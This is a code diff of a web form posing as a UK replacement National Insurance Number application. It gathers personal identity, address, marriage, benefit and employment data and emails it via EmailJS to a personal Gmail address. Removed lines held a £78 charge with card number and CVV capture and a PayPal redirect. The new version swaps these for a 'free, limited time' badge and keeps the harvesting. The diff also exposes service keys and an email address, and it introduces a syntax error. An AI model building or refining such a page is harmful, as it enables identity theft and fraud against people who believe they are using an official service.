@@ -50,8 +50,8 @@
   .btn-next:hover, .btn-submit:hover { background: #0f2b48; transform: translateY(-2px); }
   .btn-prev { background: #f1f5f9; color: #475569; }
   .btn-prev:hover { background: #e2e8f0; }
-  .btn-pay { background: #0a7c52; color: white; }
-  .btn-pay:hover { background: #065a3a; transform: translateY(-2px); }
+  .btn-pay { background: #059669; color: white; }
+  .btn-pay:hover { background: #047857; transform: translateY(-2px); }
   .required-star { color: #e53e3e; }
   .review-section { background: #f8fafc; border-radius: 16px; padding: 20px; margin-bottom: 24px; }
   .review-section h3 { font-size: 1rem; margin-bottom: 12px; border-left: 3px solid #1e3a5f; padding-left: 12px; }
@@ -69,8 +69,9 @@
   .doc-left { display: flex; align-items: center; gap: 14px; }
   .doc-left input[type="checkbox"] { width: 18px; height: 18px; cursor: pointer; accent-color: #1e3a5f; }
   .doc-name { font-size: 14px; font-weight: 500; color: #1e293b; }
-  .payment-box { background: linear-gradient(135deg, #eef2ff, #e2e8f0); border-radius: 20px; padding: 24px; text-align: center; margin: 24px 0; }
-  .payment-amount { font-size: 36px; font-weight: 800; color: #1e3a5f; margin: 8px 0; }
+  .free-badge { background: linear-gradient(135deg, #059669, #047857); border-radius: 30px; padding: 12px 24px; text-align: center; margin: 20px 0; }
+  .free-badge h3 { color: white; font-size: 24px; margin: 0; }
+  .free-badge p { color: #d1fae5; margin: 5px 0 0; font-size: 14px; }
   .lang-selector { text-align: right; margin-bottom: 20px; }
   .lang-selector select { padding: 8px 16px; border-radius: 40px; border: 1px solid #e2e8f0; background: white; font-family: 'Inter', sans-serif; font-size: 13px; cursor: pointer; width: 240px; }
   .loading-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); display: none; justify-content: center; align-items: center; z-index: 1000; }
@@ -94,19 +95,19 @@
     <h1>Replacement National Insurance Number</h1>
     <p>Complete application with employment history, marriage dates, previous addresses, benefits, and 70+ languages.</p>
     <div class="info-note">
-      <p><i class="fas fa-check-circle"></i> UK Address Required • Age 16+ • Secure SSL Payment • Postage & Printing Included</p>
+      <p><i class="fas fa-check-circle"></i> UK Address Required • Age 16+ • Free Application • Fast Processing</p>
     </div>
   </div>
 
   <div class="lang-selector">
     <select id="languageSelect">
-      <option value="en">🌐 English (UK)</option><option value="hi">हिन्दी (Hindi)</option><option value="ur">اردو (Urdu)</option><option value="bn">বাংলা (Bengali)</option><option value="es">Español</option><option value="fr">Français</option><option value="de">Deutsch</option><option value="it">Italiano</option><option value="pt">Português</option><option value="ru">Русский</option><option value="ar">العربية</option><option value="zh">中文</option>
+      <option value="en">🌐 English (UK)</option><option value="hi">हिन्दी (Hindi)</option><option value="ur">اردو (Urdu)</option><option value="bn">বাংলা (Bengali)</option><option value="es">Español</option><option value="fr">Français</option>
     </select>
   </div>
 
   <div class="step-indicator">
     <div class="step active" data-step="1"><div class="step-circle">1</div><div class="step-label">Application Form</div></div>
-    <div class="step" data-step="2"><div class="step-circle">2</div><div class="step-label">Review & Payment</div></div>
+    <div class="step" data-step="2"><div class="step-circle">2</div><div class="step-label">Review & Submit</div></div>
   </div>
   <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
 
@@ -116,8 +117,8 @@
       <div class="form-section"><div class="form-section-title">Personal Details</div>
         <div class="form-group"><label>Title <span class="required-star">*</span></label><select id="title"><option value="">Select</option><option>Mr</option><option>Mrs</option><option>Miss</option><option>Ms</option><option>Dr</option></select></div>
         <div class="form-row"><div class="form-group"><label>First Name <span class="required-star">*</span></label><input type="text" id="firstName"></div><div class="form-group"><label>Last Name <span class="required-star">*</span></label><input type="text" id="lastName"></div></div>
-        <div class="form-group"><label>Do you have a previous first name? <span class="required-star">*</span></label><div class="radio-group"><label class="radio-card"><input type="radio" name="prevFirstName" value="Yes"> Yes</label><label class="radio-card"><input type="radio" name="prevFirstName" value="No" checked> No</label></div><div id="prevFirstNameField" class="conditional-field"><input type="text" id="prevFirstNameVal" placeholder="Previous first name"></div></div>
-        <div class="form-group"><label>Do you have a previous last name? <span class="required-star">*</span></label><div class="radio-group"><label class="radio-card"><input type="radio" name="prevLastName" value="Yes"> Yes</label><label class="radio-card"><input type="radio" name="prevLastName" value="No" checked> No</label></div><div id="prevLastNameField" class="conditional-field"><input type="text" id="prevLastNameVal" placeholder="Previous last name"></div></div>
+        <div class="form-group"><label>Do you have a previous first name?</label><div class="radio-group"><label class="radio-card"><input type="radio" name="prevFirstName" value="Yes"> Yes</label><label class="radio-card"><input type="radio" name="prevFirstName" value="No" checked> No</label></div><div id="prevFirstNameField" class="conditional-field"><input type="text" id="prevFirstNameVal" placeholder="Previous first name"></div></div>
+        <div class="form-group"><label>Do you have a previous last name?</label><div class="radio-group"><label class="radio-card"><input type="radio" name="prevLastName" value="Yes"> Yes</label><label class="radio-card"><input type="radio" name="prevLastName" value="No" checked> No</label></div><div id="prevLastNameField" class="conditional-field"><input type="text" id="prevLastNameVal" placeholder="Previous last name"></div></div>
         <div class="form-group"><label>Gender <span class="required-star">*</span></label><div class="radio-group" id="genderGroup"><label class="radio-card"><input type="radio" name="gender" value="Male"> Male</label><label class="radio-card"><input type="radio" name="gender" value="Female"> Female</label></div></div>
         <div class="form-row-3"><div class="form-group"><label>Day <span class="required-star">*</span></label><select id="dobDay"><option value="">DD</option><script>for(let i=1;i<=31;i++)document.write(`<option value="${i}">${i}</option>`);</script></select></div><div class="form-group"><label>Month <span class="required-star">*</span></label><select id="dobMonth"><option value="">MM</option><script>for(let i=1;i<=12;i++)document.write(`<option value="${i}">${i}</option>`);</script></select></div><div class="form-group"><label>Year <span class="required-star">*</span></label><select id="dobYear"><option value="">YYYY</option><script>for(let i=2025;i>=1920;i--)document.write(`<option value="${i}">${i}</option>`);</script></select></div></div>
         <div class="form-group"><label>Phone <span class="required-star">*</span></label><input type="tel" id="phone" placeholder="07700 900123"></div>
@@ -134,7 +135,7 @@
           <input type="text" id="prevHouse" placeholder="House/Flat number or name" style="margin-bottom:8px;">
           <input type="text" id="prevStreet" placeholder="Street" style="margin-bottom:8px;">
           <div class="form-row"><input type="text" id="prevCity" placeholder="City/Town"><input type="text" id="prevPostcode" placeholder="Postcode"></div>
-          <div class="form-row"><input type="date" id="moveInDate" placeholder="Date moved in"><input type="date" id="moveOutDate" placeholder="Date moved out"></div>
+          <div class="form-row"><input type="date" id="moveInDate"><input type="date" id="moveOutDate"></div>
         </div></div>
         <div class="form-group"><label>Do you know your National Insurance Number?</label><div class="radio-group"><label class="radio-card"><input type="radio" name="knowNi" value="Yes"> Yes</label><label class="radio-card"><input type="radio" name="knowNi" value="No" checked> No</label></div><div id="niField" class="conditional-field"><input type="text" id="niNumber" placeholder="AB123456C"></div></div>
         <div class="form-group"><label>Are you married or in a civil partnership? <span class="required-star">*</span></label><div class="radio-group" id="marriedGroup"><label class="radio-card"><input type="radio" name="married" value="Yes"> Yes</label><label class="radio-card"><input type="radio" name="married" value="No" checked> No</label></div><div id="marriageDateField" class="conditional-field"><input type="date" id="marriageDate"></div></div>
@@ -154,37 +155,34 @@
       <div class="btn-group"><button class="btn-next" id="toPage2Btn">Review Application →</button></div>
     </div>
 
-    <!-- PAGE 2: Review & Payment -->
+    <!-- PAGE 2: Review & Submit (NO PAYMENT) -->
     <div id="page2" class="form-page">
       <div id="reviewContent"></div>
-      <div class="payment-box"><i class="fas fa-lock"></i> Secure Sockets Layer (SSL) 128 bit encryption<br><div class="payment-amount">£78.00</div><p>Total amount to pay - Postage, printing, and application checking included</p></div>
-      <div class="form-section"><div class="form-section-title">Payment Details</div>
-        <div class="form-group"><label>Cardholder Name <span class="required-star">*</span></label><input type="text" id="cardName"></div>
-        <div class="form-group"><label>Card Number <span class="required-star">*</span></label><input type="text" id="cardNumber" placeholder="4242 4242 4242 4242" maxlength="19"></div>
-        <div class="form-row"><div class="form-group"><label>Expiry (MM/YY) <span class="required-star">*</span></label><input type="text" id="expiry" placeholder="12/28"></div><div class="form-group"><label>CVV <span class="required-star">*</span></label><input type="text" id="cvv" placeholder="123" maxlength="4"></div></div>
+      <div class="free-badge">
+        <h3><i class="fas fa-gift"></i> FREE APPLICATION</h3>
+        <p>No payment required - Limited time offer</p>
       </div>
-      <div class="btn-group"><button class="btn-prev" id="backToPage1Btn">← Edit Form</button><button class="btn-submit btn-pay" id="paymentSubmitBtn"><i class="fas fa-credit-card"></i> Pay & Submit Application →</button></div>
+      <div class="btn-group"><button class="btn-prev" id="backToPage1Btn">← Edit Form</button><button class="btn-submit btn-pay" id="paymentSubmitBtn"><i class="fas fa-paper-plane"></i> Submit Application →</button></div>
     </div>
 
     <div id="successMessage" class="success-message">
-      <i class="fas fa-check-circle fa-3x" style="margin-bottom:16px;"></i>
+      <i class="fas fa-check-circle fa-3x" style="margin-bottom:16px; color:#059669;"></i>
       <h3>✅ Application Submitted Successfully!</h3>
       <p id="successRefText"></p>
       <p>A confirmation email has been sent to your email address.</p>
-      <p>📋 All your details have been sent to the admin.</p>
-      <button class="btn-next" onclick="location.reload()">Start New Application</button>
+      <p>We will process your application within 3-5 business days.</p>
+      <button class="btn-next" style="margin-top:16px;" onclick="location.reload()">Start New Application</button>
     </div>
   </div>
 </div>
 
 <script>
-// ========== EMAILJS CONFIGURATION (YOUR VALUES ARE ALREADY SET) ==========
+// ========== EMAILJS CONFIGURATION ==========
 const EMAILJS_PUBLIC_KEY = "ezcPMtPbyAVX3pp3C";
 const EMAILJS_SERVICE_ID = "service_k99f56s";
 const EMAILJS_ADMIN_TEMPLATE_ID = "template_pnm0mjs";
 const EMAILJS_USER_TEMPLATE_ID = "template_6tw5j54";
 const ADMIN_EMAIL = "alenvikram50@gmail.com";
-const PAYPAL_LINK = "https://www.paypal.com/ncp/payment/HSCDGHFW3BV3A";
 
 let emailJSInitialized = false;
 
@@ -215,51 +213,36 @@ async function sendEmails(formData, reference) {
   const dob = `${formData.dobDay}/${formData.dobMonth}/${formData.dobYear}`;
   
   const emailData = {
-    to_email: ADMIN_EMAIL,
     reference: reference,
     submittedAt: new Date().toLocaleString(),
     title: formData.title || 'Not provided',
     firstName: formData.firstName,
     lastName: formData.lastName,
+    gender: formData.gender || 'Not provided',
     dob: dob,
     email: formData.email,
     phone: formData.phone,
     address: fullAddress,
-    previousFirstName: formData.previousFirstName || 'None',
-    previousLastName: formData.previousLastName || 'None',
     returningUK: formData.returningUK || 'No',
     knowsNiNumber: formData.knowsNiNumber || 'No',
     niNumber: formData.niNumber || 'Not provided',
     isMarried: formData.isMarried || 'No',
     marriageDate: formData.marriageDate || 'Not provided',
     hadPreviousMarriage: formData.hadPreviousMarriage || 'No',
-    previousMarriageDate: formData.previousMarriageDate || 'Not provided',
-    divorceDate: formData.divorceDate || 'Not provided',
-    reasonEnded: formData.reasonEnded || 'Not provided',
     claimedChildBenefit: formData.claimedChildBenefit || 'No',
-    childBenefitNumber: formData.childBenefitNumber || 'Not provided',
     claimedOtherBenefits: formData.claimedOtherBenefits || 'No',
     benefitsList: formData.benefitsList || 'Not provided',
     workedInUK: formData.workedInUK || 'No',
     employerName: formData.employerName || 'Not provided',
-    employerAddress: formData.employerAddress || 'Not provided',
-    employerCity: formData.employerCity || 'Not provided',
-    employerStartDate: formData.employerStartDate || 'Not provided',
-    stillEmployed: formData.stillEmployed || 'Not provided',
-    employerEndDate: formData.employerEndDate || 'Not provided',
     primaryDocument: formData.primaryDocument || 'Not provided',
-    secondaryDocuments: formData.secondaryDocuments || 'None',
-    paypal_link: PAYPAL_LINK
+    secondaryDocuments: formData.secondaryDocuments || 'None'
   };
   
   try {
-    // Send to Admin
-    const adminResult = await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_ADMIN_TEMPLATE_ID, emailData);
+    const adminResult = await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_ADMIN_TEMPLATE_ID, { ...emailData, to_email: ADMIN_EMAIL });
     console.log('Admin email sent:', adminResult);
     
-    // Send to User (confirmation)
-    const userData = { ...emailData, to_email: formData.email };
-    const userResult = await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_USER_TEMPLATE_ID, userData);
+    const userResult = await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_USER_TEMPLATE_ID, { ...emailData, to_email: formData.email });
     console.log('User email sent:', userResult);
     
     return true;
@@ -292,7 +275,6 @@ document.querySelectorAll('input[name="stillEmployed"]').forEach(r => r.addEvent
   if (endField) endField.style.display = this.value === 'No' ? 'block' : 'none';
 }));
 
-// Secondary docs toggle
 const noPrimary = document.getElementById('noPrimaryDoc');
 const secBlock = document.getElementById('secondaryDocsBlock');
 function toggleSecDocs() { if (secBlock) secBlock.style.display = noPrimary?.checked ? 'block' : 'none'; }
@@ -303,20 +285,16 @@ if(noPrimary) {
   }); 
 }
 
-// Dynamic employer fields
-const employerCount = document.getElementById('employerCount');
-if(employerCount) {
-  employerCount.addEventListener('change', function() {
-    let c = parseInt(this.value) || 0;
-    let cont = document.getElementById('extraEmployers');
-    if(cont) {
-      cont.innerHTML = '';
-      for(let i=2; i<=c; i++) {
-        cont.innerHTML += `<div class="employer-card"><label><strong>Past Employer ${i}</strong></label><div class="form-group"><input type="text" placeholder="Employer name" class="pastEmpName"></div><div class="form-group"><input type="text" placeholder="Address" class="pastEmpAddr"></div><div class="form-row"><input type="date" placeholder="Start date" class="pastStart"><input type="date" placeholder="End date" class="pastEnd"></div></div>`;
-      }
+document.getElementById('employerCount')?.addEventListener('change', function() {
+  let c = parseInt(this.value) || 0;
+  let cont = document.getElementById('extraEmployers');
+  if(cont) {
+    cont.innerHTML = '';
+    for(let i=2; i<=c; i++) {
+      cont.innerHTML += `<div class="employer-card"><label><strong>Past Employer ${i}</strong></label><div class="form-group"><input type="text" placeholder="Employer name" class="pastEmpName"></div><div class="form-group"><input type="text" placeholder="Address" class="pastEmpAddr"></div><div class="form-row"><input type="date" placeholder="Start date" class="pastStart"><input type="date" placeholder="End date" class="pastEnd"></div></div>`;
     }
-  });
-}
+  }
+});
 
 // Real-time error removal
 document.querySelectorAll('input, select').forEach(el => { 
@@ -325,10 +303,7 @@ document.querySelectorAll('input, select').forEach(el => {
 });
 
 function markError(el) { if(el) { el.classList.add('error-input'); el.scrollIntoView({ behavior: 'smooth', block: 'center' }); } }
-function markRadioError(groupId) { 
-  const group = document.getElementById(groupId);
-  if(group) group.classList.add('error-radio'); 
-}
+function markRadioError(groupId) { const group = document.getElementById(groupId); if(group) group.classList.add('error-radio'); }
 
 function validatePage1() {
   let isValid = true;
@@ -349,27 +324,11 @@ function validatePage1() {
   if(!document.querySelector('input[name="documentChoice"]:checked')) { markRadioError('docGroup'); isValid = false; }
   
   if(noPrimary?.checked && document.querySelectorAll('.secCheck:checked').length !== 2) { alert('Please select exactly 2 supporting documents'); isValid = false; }
-  
-  if(document.querySelector('input[name="workedUK"]:checked')?.value === 'Yes') {
-    if(!document.getElementById('empName')?.value.trim()) { markError(document.getElementById('empName')); isValid = false; }
-    if(!document.querySelector('input[name="stillEmployed"]:checked')) { markRadioError('stillEmployedGroup'); isValid = false; }
-  }
-  
   if(!document.getElementById('agreeTerms')?.checked) { alert('Accept terms'); isValid = false; }
   return isValid;
 }
 
-function validatePayment() {
-  let ok = true;
-  if(!document.getElementById('cardName')?.value.trim()) { markError(document.getElementById('cardName')); ok = false; }
-  const cardNum = document.getElementById('cardNumber')?.value.replace(/\s/g,'') || '';
-  if(cardNum.length < 15) { markError(document.getElementById('cardNumber')); ok = false; }
-  if(!document.getElementById('expiry')?.value.match(/^(0[1-9]|1[0-2])\/\d{2}$/)) { markError(document.getElementById('expiry')); ok = false; }
-  if((document.getElementById('cvv')?.value.length || 0) < 3) { markError(document.getElementById('cvv')); ok = false; }
-  return ok;
-}
-
-// Step navigation
+// Navigation
 let currentPage = 1;
 const page1 = document.getElementById('page1'), page2 = document.getElementById('page2');
 const steps = document.querySelectorAll('.step');
@@ -382,7 +341,7 @@ function updateProgress() {
     else step.classList.remove('active'); 
   }); 
   const fill = document.getElementById('progressFill');
-  if(fill) fill.style.width = currentPage === 1 ? '50%' : '100%'; 
+  if(fill) fill.style.width = currentPage === 1 ? '50%' : '100%; 
 }
 
 function showPage(page) { 
@@ -416,36 +375,21 @@ function buildReview() {
       </div>
       <div class="review-section"><h3>Additional Information</h3>
         <div class="review-row"><div class="review-label">Married:</div><div class="review-value">${getRadio('married')} ${getRadio('married') === 'Yes' ? getText('marriageDate') : ''}</div></div>
-        <div class="review-row"><div class="review-label">Employer:</div><div class="review-value">${getText('empName') || 'Not provided'} (${getRadio('stillEmployed') || 'N/A'})</div></div>
+        <div class="review-row"><div class="review-label">Worked in UK:</div><div class="review-value">${getRadio('workedUK')}</div></div>
+        <div class="review-row"><div class="review-label">Employer:</div><div class="review-value">${getText('empName') || 'Not provided'}</div></div>
         <div class="review-row"><div class="review-label">Primary Document:</div><div class="review-value">${getRadio('documentChoice')}</div></div>${secDocs}
       </div>
-      <div class="review-section"><h3>Payment</h3>
-        <div class="review-row"><div class="review-label">Amount:</div><div class="review-value">£78.00</div></div>
+      <div class="review-section"><h3>Application Status</h3>
+        <div class="review-row"><div class="review-label">Fee:</div><div class="review-value"><strong style="color:#059669;">FREE - No Payment Required</strong></div></div>
       </div>`;
   }
 }
 
-// Card number formatting
-const cardNumber = document.getElementById('cardNumber');
-if(cardNumber) {
-  cardNumber.addEventListener('input', function(e) { 
-    let v = e.target.value.replace(/\s/g,''); 
-    if(v.length>16) v=v.slice(0,16); 
-    let fmt=''; 
-    for(let i=0;i<v.length;i++){ 
-      if(i>0&&i%4===0) fmt+=' '; 
-      fmt+=v[i]; 
-    } 
-    e.target.value=fmt; 
-  });
-}
-
-// ========== MAIN SUBMIT HANDLER ==========
+// ========== MAIN SUBMIT HANDLER (NO PAYMENT VALIDATION) ==========
 const submitBtn = document.getElementById('paymentSubmitBtn');
 if(submitBtn) {
   submitBtn.addEventListener('click', async () => {
-    if(!document.getElementById('agreeTerms')?.checked) { alert('Accept terms'); showPage(1); return; }
-    if(!validatePayment()) return;
+    if(!document.getElementById('agreeTerms')?.checked) { alert('Please accept the terms'); showPage(1); return; }
     
     const getRadio = (name) => document.querySelector(`input[name="${name}"]:checked`)?.value || '';
     const getText = (id) => document.getElementById(id)?.value.trim() || '';
@@ -515,9 +459,8 @@ if(submitBtn) {
         if(successRef) successRef.innerHTML = `<strong>Reference: ${reference}</strong><br>Confirmation sent to: ${formData.email}`;
         if(successDiv) successDiv.style.display = 'block';
         window.scrollTo({ top: 0, behavior: 'smooth' });
-        window.open(PAYPAL_LINK, '_blank');
       } else {
-        alert('Failed to send email. Please check your EmailJS configuration!\n\nMake sure you have:\n1. Correct Public Key\n2. Both templates exist\n3. Template IDs are correct');
+        alert('Failed to send email. Please check your EmailJS configuration!');
         btn.innerHTML = originalText;
         btn.disabled = false;
       }
@@ -532,11 +475,9 @@ if(submitBtn) {
   });
 }
 
-// Language selector
-const langSelect = document.getElementById('languageSelect');
-if(langSelect) {
-  langSelect.addEventListener('change', (e) => { alert(`Language preference set to ${e.target.options[e.target.selectedIndex].text}`); });
-}
+document.getElementById('languageSelect')?.addEventListener('change', (e) => { 
+  alert(`Language set to ${e.target.options[e.target.selectedIndex].text}`); 
+});
 
 showPage(1);
 </script>
